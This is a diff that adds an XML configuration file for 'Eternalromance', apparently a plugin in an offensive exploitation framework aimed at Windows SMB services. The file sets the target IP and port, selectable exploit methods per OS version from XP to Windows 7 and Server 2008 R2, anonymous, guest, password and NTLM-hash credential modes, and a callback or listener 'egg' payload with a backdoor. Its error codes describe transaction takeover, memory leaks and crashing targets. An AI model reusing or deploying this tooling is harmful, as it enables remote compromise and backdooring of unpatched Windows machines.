@@ -1,0 +1,455 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<config xmlns="urn:trch"
+        id="7fca44399ae06e52cb50bfdf9ce6bd0f2ed5d28b"
+        name="Eternalromance"
+        version="1.3.0"
+        configversion="1.3.0.0"
+        schemaversion="2.0.0">
+  <inputparameters>
+    <!-- All plugins that perform blocking network calls must have a NetworkTimeout
+     parameter or its equivalent -->
+    <parameter name="NetworkTimeout"
+               description="Timeout for blocking network calls (in seconds).  Use -1 for no timeout."
+               type="S16">
+      <default>60</default>
+    </parameter>
+    <parameter name="TargetIp"
+               description="Target IP Address"
+               type="IPv4"/>
+    <parameter name="TargetPort" description="Target TCP port" type="TcpPort">
+      <default>445</default>
+    </parameter>
+    <parameter name="MaxExploitAttempts"
+               description="Number of tries to exploit. Default 3"
+               type="U32"
+               hidden="true">
+      <default>3</default>
+    </parameter>
+    <parameter name="PipeName"
+           description="The named pipe to use"
+           type="String">
+    </parameter>
+
+    <paramchoice name="ExploitMethod" description="Which exploit method to use">
+      <default>Default</default>
+
+      <paramgroup name="Default" description="Use the best exploit method(s) for the target OS">
+        <parameter name="ExploitMethodChoice" type="U32" hidden="true" description="">
+          <default>0</default>
+        </parameter>
+      </paramgroup>
+
+      <paramgroup name="Fish-in-a-barrel" description="Most reliable exploit method (XP/2k3 only)">
+        <parameter name="ExploitMethodChoice" type="U32" hidden="true" description="">
+          <default>1</default>
+        </parameter>
+      </paramgroup>
+
+      <paramgroup name="Matched-pairs" description="Next reliable exploit method (XP/Win7/2k8R2 only)">
+        <parameter name="ExploitMethodChoice" type="U32" hidden="true" description="">
+          <default>2</default>
+        </parameter>
+      </paramgroup>
+
+      <paramgroup name="Classic-Romance" description="Original LargePageGroom exploit method (All OS Versions)">
+        <parameter name="ExploitMethodChoice" type="U32" hidden="true" description="">
+          <default>3</default>
+        </parameter>
+      </paramgroup>
+      
+    </paramchoice>
+
+    <paramchoice name="Credentials" description="Type of credentials to use">
+      <default>Anonymous</default>
+
+      <paramgroup name="Anonymous" description="Anonymous (NULL session)">
+        <parameter name="CredChoice" type="U32" hidden="true" description="">
+          <default>0</default>
+        </parameter>
+        <parameter name="Username" type="Buffer" hidden="true" description="">
+          <default></default>
+        </parameter>
+
+        <parameter name="Password" type="Buffer" hidden="true" description="">
+          <default></default>
+        </parameter>
+      </paramgroup>
+
+      <paramgroup name="Guest" description="Guest account">
+        <parameter name="CredChoice" type="U32" hidden="true" description="">
+          <default>1</default>
+        </parameter>
+        <parameter name="Password" type="Buffer" hidden="true" description="">
+          <default></default>
+        </parameter>
+      </paramgroup>
+
+      <paramgroup name="Blank" description="User account with no password set">
+        <parameter name="CredChoice" type="U32" hidden="true" description="">
+          <default>2</default>
+        </parameter>
+        <parameter name="Username" type="Buffer" description="Username entered as hex bytes (in unicode)"/>
+        <parameter name="Password" type="Buffer" hidden="true" description="">
+          <default></default>
+        </parameter>
+      </paramgroup>
+
+      <paramgroup name="Password" description="User name and password">
+        <parameter name="CredChoice" type="U32" hidden="true" description="">
+          <default>3</default>
+        </parameter>
+        <parameter name="Username" type="Buffer" description="Username entered as hex bytes (in unicode)"/>
+        <parameter name="Password" type="Buffer" description="Password entered as hex bytes (in unicode)"/>
+      </paramgroup>
+
+      <paramgroup name="NTLM" description="User name and NTLM hash">
+        <parameter name="CredChoice" type="U32" hidden="true" description="">
+          <default>4</default>
+        </parameter>
+        <parameter name="Username" type="Buffer" description="Username entered as hex bytes (in unicode)"/>
+        <parameter name="NtlmHash" type="Buffer" description="NTLM password hash (in hex)"/>
+      </paramgroup>
+    </paramchoice>
+
+    <paramchoice name="Protocol" description="SMB (default port 445) or NBT (default port 139)">
+      <default>SMB</default>
+      <paramgroup name="SMB" description="">
+        <parameter name="UsingNbt" description="Boolean stating to use Nbt or not" type="Boolean" hidden="true">
+          <default>0</default>
+        </parameter>
+      </paramgroup>
+      <paramgroup name="NBT" description="">
+        <parameter name="UsingNbt" description="Boolean stating to use Nbt or not" type="Boolean" hidden="true">
+          <default>1</default>
+        </parameter>
+      </paramgroup>
+    </paramchoice>
+
+    <paramchoice name="Target" description="Operating System, Service Pack, of target OS">
+      <paramgroup name="XP_SP0SP1_X86" description="Windows XP Sp0 and Sp1, 32-bit">
+        <parameter name="OsMajor" hidden="true" type="U8" description="OS Major Version" >
+          <default>5</default>
+        </parameter>
+        <parameter name="OsMinor" hidden="true" type="U8" description="OS Minor Version" >
+          <default>1</default>
+        </parameter>
+        <parameter name="OsServicePack" hidden="true" type="U8" description="OS Service Pack Level" >
+          <default>0</default>
+        </parameter>
+      </paramgroup>
+      <paramgroup name="XP_SP2SP3_X86" description="Windows XP Sp2 and Sp3, 32-bit">
+        <parameter name="OsMajor" hidden="true" type="U8" description="OS Major Version" >
+          <default>5</default>
+        </parameter>
+        <parameter name="OsMinor" hidden="true" type="U8" description="OS Minor Version" >
+          <default>1</default>
+        </parameter>
+        <parameter name="OsServicePack" hidden="true" type="U8" description="OS Service Pack Level" >
+          <default>2</default>
+        </parameter>
+      </paramgroup>
+      <paramgroup name="XP_SP1_X64" description="Windows XP Sp1, 64-bit">
+        <parameter name="OsMajor" hidden="true" type="U8" description="OS Major Version" >
+          <default>5</default>
+        </parameter>
+        <parameter name="OsMinor" hidden="true" type="U8" description="OS Minor Version" >
+          <default>2</default>
+        </parameter>
+        <parameter name="OsServicePack" hidden="true" type="U8" description="OS Service Pack Level" >
+          <default>1</default>
+        </parameter>
+      </paramgroup>
+      <paramgroup name="XP_SP2_X64" description="Windows XP Sp2, 64-bit">
+        <parameter name="OsMajor" hidden="true" type="U8" description="OS Major Version" >
+          <default>5</default>
+        </parameter>
+        <parameter name="OsMinor" hidden="true" type="U8" description="OS Minor Version" >
+          <default>2</default>
+        </parameter>
+        <parameter name="OsServicePack" hidden="true" type="U8" description="OS Service Pack Level" >
+          <default>2</default>
+        </parameter>
+      </paramgroup>
+      <paramgroup name="SERVER_2003_SP0" description="Windows Sever 2003 Sp0, 32-bit">
+        <parameter name="OsMajor" hidden="true" type="U8" description="OS Major Version" >
+          <default>5</default>
+        </parameter>
+        <parameter name="OsMinor" hidden="true" type="U8" description="OS Minor Version" >
+          <default>2</default>
+        </parameter>
+        <parameter name="OsServicePack" hidden="true" type="U8" description="OS Service Pack Level" >
+          <default>0</default>
+        </parameter>
+      </paramgroup>
+      <paramgroup name="SERVER_2003_SP1" description="Windows Sever 2003 Sp1, 32-bit/64-bit">
+        <parameter name="OsMajor" hidden="true" type="U8" description="OS Major Version" >
+          <default>5</default>
+        </parameter>
+        <parameter name="OsMinor" hidden="true" type="U8" description="OS Minor Version" >
+          <default>2</default>
+        </parameter>
+        <parameter name="OsServicePack" hidden="true" type="U8" description="OS Service Pack Level" >
+          <default>1</default>
+        </parameter>
+      </paramgroup>
+      <paramgroup name="SERVER_2003_SP2" description="Windows Sever 2003 Sp2, 32-bit/64-bit">
+        <parameter name="OsMajor" hidden="true" type="U8" description="OS Major Version" >
+          <default>5</default>
+        </parameter>
+        <parameter name="OsMinor" hidden="true" type="U8" description="OS Minor Version" >
+          <default>2</default>
+        </parameter>
+        <parameter name="OsServicePack" hidden="true" type="U8" description="OS Service Pack Level" >
+          <default>2</default>
+        </parameter>
+      </paramgroup>
+      <paramgroup name="VISTA_SP0" description="Windows Vista Sp0, 32-bit/64-bit">
+        <parameter name="OsMajor" hidden="true" type="U8" description="OS Major Version" >
+          <default>6</default>
+        </parameter>
+        <parameter name="OsMinor" hidden="true" type="U8" description="OS Minor Version" >
+          <default>0</default>
+        </parameter>
+        <parameter name="OsServicePack" hidden="true" type="U8" description="OS Service Pack Level" >
+          <default>0</default>
+        </parameter>
+      </paramgroup>
+      <paramgroup name="VISTA_SP1" description="Windows Vista Sp1, 32-bit/64-bit">
+        <parameter name="OsMajor" hidden="true" type="U8" description="OS Major Version" >
+          <default>6</default>
+        </parameter>
+        <parameter name="OsMinor" hidden="true" type="U8" description="OS Minor Version" >
+          <default>0</default>
+        </parameter>
+        <parameter name="OsServicePack" hidden="true" type="U8" description="OS Service Pack Level" >
+          <default>1</default>
+        </parameter>
+      </paramgroup>
+      <paramgroup name="VISTA_SP2" description="Windows Vista Sp2, 32-bit/64-bit">
+        <parameter name="OsMajor" hidden="true" type="U8" description="OS Major Version" >
+          <default>6</default>
+        </parameter>
+        <parameter name="OsMinor" hidden="true" type="U8" description="OS Minor Version" >
+          <default>0</default>
+        </parameter>
+        <parameter name="OsServicePack" hidden="true" type="U8" description="OS Service Pack Level" >
+          <default>2</default>
+        </parameter>
+      </paramgroup>
+      <paramgroup name="SERVER_2008_SP0" description="Windows Server 2008 Sp0, 32-bit/64-bit">
+        <parameter name="OsMajor" hidden="true" type="U8" description="OS Major Version" >
+          <default>6</default>
+        </parameter>
+        <parameter name="OsMinor" hidden="true" type="U8" description="OS Minor Version" >
+          <default>0</default>
+        </parameter>
+        <parameter name="OsServicePack" hidden="true" type="U8" description="OS Service Pack Level" >
+          <default>0</default>
+        </parameter>
+      </paramgroup>
+      <paramgroup name="SERVER_2008_SP1" description="Windows Server 2008 Sp1, 32-bit/64-bit">
+        <parameter name="OsMajor" hidden="true" type="U8" description="OS Major Version" >
+          <default>6</default>
+        </parameter>
+        <parameter name="OsMinor" hidden="true" type="U8" description="OS Minor Version" >
+          <default>0</default>
+        </parameter>
+        <parameter name="OsServicePack" hidden="true" type="U8" description="OS Service Pack Level" >
+          <default>1</default>
+        </parameter>
+      </paramgroup>
+      <paramgroup name="SERVER_2008_SP2" description="Windows Server 2008 Sp2, 32-bit/64-bit">
+        <parameter name="OsMajor" hidden="true" type="U8" description="OS Major Version" >
+          <default>6</default>
+        </parameter>
+        <parameter name="OsMinor" hidden="true" type="U8" description="OS Minor Version" >
+          <default>0</default>
+        </parameter>
+        <parameter name="OsServicePack" hidden="true" type="U8" description="OS Service Pack Level" >
+          <default>2</default>
+        </parameter>
+      </paramgroup>
+      <paramgroup name="WIN7_SP0" description="Windows 7 Sp0, 32-bit/64-bit">
+        <parameter name="OsMajor" hidden="true" type="U8" description="OS Major Version" >
+          <default>6</default>
+        </parameter>
+        <parameter name="OsMinor" hidden="true" type="U8" description="OS Minor Version" >
+          <default>1</default>
+        </parameter>
+        <parameter name="OsServicePack" hidden="true" type="U8" description="OS Service Pack Level" >
+          <default>0</default>
+        </parameter>
+      </paramgroup>
+      <paramgroup name="WIN7_SP1" description="Windows 7 Sp1, 32-bit/64-bit">
+        <parameter name="OsMajor" hidden="true" type="U8" description="OS Major Version" >
+          <default>6</default>
+        </parameter>
+        <parameter name="OsMinor" hidden="true" type="U8" description="OS Minor Version" >
+          <default>1</default>
+        </parameter>
+        <parameter name="OsServicePack" hidden="true" type="U8" description="OS Service Pack Level" >
+          <default>1</default>
+        </parameter>
+      </paramgroup>
+      <paramgroup name="SERVER_2008R2_SP0" description="Windows Server 2008 R2 Sp0, 32-bit/64-bit">
+        <parameter name="OsMajor" hidden="true" type="U8" description="OS Major Version" >
+          <default>6</default>
+        </parameter>
+        <parameter name="OsMinor" hidden="true" type="U8" description="OS Minor Version" >
+          <default>1</default>
+        </parameter>
+        <parameter name="OsServicePack" hidden="true" type="U8" description="OS Service Pack Level" >
+          <default>0</default>
+        </parameter>
+      </paramgroup>
+      <paramgroup name="SERVER_2008R2_SP1" description="Windows Server 2008 R2 Sp1, 32-bit/64-bit">
+        <parameter name="OsMajor" hidden="true" type="U8" description="OS Major Version" >
+          <default>6</default>
+        </parameter>
+        <parameter name="OsMinor" hidden="true" type="U8" description="OS Minor Version" >
+          <default>1</default>
+        </parameter>
+        <parameter name="OsServicePack" hidden="true" type="U8" description="OS Service Pack Level" >
+          <default>1</default>
+        </parameter>
+      </paramgroup>
+    </paramchoice>
+
+    <parameter name="TeardownBackdoorAtCompletion" description="Boolean stating whether or not to remove the backdoor following successful callback/callin" type="Boolean" hidden="true">
+      <default>0</default>
+    </parameter>
+
+    <paramchoice name="Payload" description="How the egg will behave">
+      <default>Callback</default>
+
+      <paramgroup name="Callback" description="The egg will callback to the specified IP and Port">
+        <parameter name="CallbackIp" description="Callback IP address the egg will connect to from target" type="IPv4"/>
+        <parameter name="CallbackPort" description="Callback port that the egg will connect to from target" type="TcpPort">
+          <default>0</default>
+        </parameter>
+        <parameter name="CallbackLocalPort" description="Callback port that we will listen on to receive the eggs connection" type="TcpPort" required="false"/>
+      </paramgroup>
+
+      <paramgroup name="Listener" description="The egg will open up a new listening port.">
+        <parameter name="ListenPort" description="Port the egg will listen on" type="TcpPort"/>
+        <parameter name="CallinPort" description="Port we connect to" type="TcpPort" required="false"/>
+      </paramgroup>
+    </paramchoice>
+  </inputparameters>
+
+  <outputparameters>
+    <paramchoice name="Contract"
+                 description="The contract fulfilled by this plugin">
+      <value>StagedUpload</value>
+      <paramgroup name="StagedUpload" description="">
+        <parameter name="ConnectedTcp"
+                   description="The connected socket"
+                   type="Socket"/>
+        <parameter name="XorMask"
+                   description="Masking byte"
+                   type="U8"/>
+      </paramgroup>
+    </paramchoice>
+    <parameter name="TargetOsArchitecture"
+               description="The architecture of the target operating system"
+               type="String"/>
+  </outputparameters>
+
+  <errors>
+    <errorcode name="ETRO_ERROR_NO_MEMORY" value="65" description="Out of memory"/>
+    <errorcode name="ETRO_ERROR_INVALID_PIPE_CHOICE" value="66" description="Named pipe choice not supported"/>
+    <errorcode name="ETRO_UNALIGNED_RPC_STRUCT" value="67" description="Unaligned data attempted to be sent over browser pipe"/>
+    <errorcode name="ETRO_ERROR_PIPES_NOT_AVAILABLE" value="68" description="No pipes available to connect to"/>
+    <errorcode name="ETRO_ERROR_WINSOCK_STARTUP" value="69" description="Winsock failed to start up"/>
+    <errorcode name="ETRO_ERROR_PARAM_INIT" value="69" description="Error during parameter initialization"/>
+    <errorcode name="ETRO_ERROR_TRANS_NOT_FOUND" value="70" description="Unable to find a Transaction struct with info leak"/>
+    <errorcode name="ETRO_ERROR_TRANS_WRITE_OUT_OF_RANGE" value="71" description="Cannot write that far into Transaction, should have written more with WriteAndX"/>
+    <errorcode name="ETRO_ERROR_TRANS_TAKEOVER_UNSUCCESSFUL" value="72" description="Memory written to was not a transaction we controlled"/>
+    <errorcode name="ETRO_ERROR_OUT_OF_REMOTE_MEMORY" value="73" description="Out of memory to use in remote transaction"/>
+    <errorcode name="ETRO_ERROR_UNKNOWN_TRANS_SIZE" value="74" description="Unknown transaction size detected"/>
+    <errorcode name="ETRO_ERROR_NOT_ENOUGH_LEAK_DATA" value="75" description="Leak returned with less data than it should have"/>
+    <errorcode name="ETRO_ERROR_STRUCT_WALK_ABORTED" value="76" description="Failed to walk structures and find Srv module"/>
+    <errorcode name="ETRO_ERROR_BACKDOOR_NOT_PRESENT" value="77" description="Backdoor transaction sent but backdoor did not respond"/>
+    <errorcode name="ETRO_ERROR_PAYLOAD_TOO_LARGE" value="78" description="Stage 1 payload exceeded max allowed size (0xFFFF)"/>
+    <errorcode name="ETRO_ERROR_BACKDOOR_RETURNED_ERROR" value="79" description="Backdoor present but returned an error code"/>
+    <errorcode name="ETRO_ERROR_BLUE_SCREENED_TARGET" value="80" description="Overwrite caused the target to blue screen"/>
+    <errorcode name="ETRO_ERROR_OS_NOT_SUPPORTED" value="81" description="Offsets not available for the targeted OS"/>
+    <errorcode name="ETRO_ERROR_DISPATCH_TABLE_NOT_FOUND" value="82" description="Unable to locate the dispatch table in memory"/>
+    <errorcode name="ETRO_ERROR_EXPLOITATION_UNSUCCESSFUL" value="83" description="Exploit methods were tried and were not successful"/>
+    <errorcode name="ETRO_ERROR_EXPLOIT_METHOD_UNSUCCESSFUL" value="84" description="Exploit method was not successful but did not crash, other methods may be tried"/>
+    <errorcode name="ETRO_ERROR_INVALID_EXPLOIT_METHOD" value="85" description="Exploit method not possible for target OS"/>
+  </errors>
+
+  <redirection>
+    <local protocol="TCP"
+           listenaddr="TargetIp"
+           listenport="TargetPort"
+           destaddr="TargetIp"
+           destport="TargetPort"
+           closeoncompletion="true"/>
+    <remote protocol="TCP"
+            listenaddr="CallbackIp"
+            listenport="CallbackPort"
+            destport="CallbackLocalPort"/>
+  </redirection>
+
+  <logic>
+    <and>
+      <service name="smb">
+        <bindtovalue name="Protocol" value="SMB"/>
+        <bindtopath name="TargetPort" path="//service[name='smb']/port"/>
+      </service>
+      <or>
+        <os family="windows" name="Windows XP">
+          <bindtovalue name="Target" value="XP"/>
+        </os>
+        <os family="windows" name="Windows 2003" servicepack="0" architecture="x86 32-bit">
+          <bindtovalue name="Target" value="W2K3SP0"/>
+        </os>
+        <os family="windows" name="Windows 2003" servicepack="1" architecture="x86 32-bit">
+          <bindtovalue name="Target" value="W2K3SP1"/>
+        </os>
+        <os family="windows" name="Windows 2003" servicepack="2" architecture="x86 32-bit">
+          <bindtovalue name="Target" value="W2K3SP2"/>
+        </os>
+        <os family="windows" name="Windows XP" servicepack="1" architecture="x64 64-bit">
+          <bindtovalue name="Target" value="W2K3XPX64SP1"/>
+        </os>
+        <os family="windows" name="Windows XP" servicepack="2" architecture="x64 64-bit">
+          <bindtovalue name="Target" value="W2K3XPX64SP2"/>
+        </os>
+        <os family="windows" name="Windows 2003" servicepack="1" architecture="x64 64-bit">
+          <bindtovalue name="Target" value="W2K3XPX64SP1"/>
+        </os>
+        <os family="windows" name="Windows 2003" servicepack="2" architecture="x64 64-bit">
+          <bindtovalue name="Target" value="W2K3XPX64SP2"/>
+        </os>
+        <os family="windows" name="Windows Vista" servicepack="0" architecture="x86 32-bit">
+          <bindtovalue name="Target" value="WVISTA_2008_7"/>
+        </os>
+        <os family="windows" name="Windows Vista" servicepack="1" architecture="x86 32-bit">
+          <bindtovalue name="Target" value="WVISTA_2008_7"/>
+        </os>
+        <os family="windows" name="Windows Vista" servicepack="2" architecture="x86 32-bit">
+          <bindtovalue name="Target" value="WVISTA_2008_7"/>
+        </os>
+        <os family="windows" name="Windows 2008" servicepack="0" architecture="x86 32-bit">
+          <bindtovalue name="Target" value="WVISTA_2008_7"/>
+        </os>
+        <os family="windows" name="Windows 2008" servicepack="1" architecture="x86 32-bit">
+          <bindtovalue name="Target" value="WVISTA_2008_7"/>
+        </os>
+        <os family="windows" name="Windows 2008" servicepack="2" architecture="x86 32-bit">
+          <bindtovalue name="Target" value="WVISTA_2008_7"/>
+        </os>
+        <os family="windows" name="Windows 2008 R2" servicepack="0" architecture="x86 32-bit">
+          <bindtovalue name="Target" value="WVISTA_2008_7"/>
+        </os>
+        <os family="windows" name="Windows 7" servicepack="0" architecture="x86 32-bit">
+          <bindtovalue name="Target" value="WVISTA_2008_7"/>
+        </os>
+      </or>
+    </and>
+  </logic>
+
+</config>
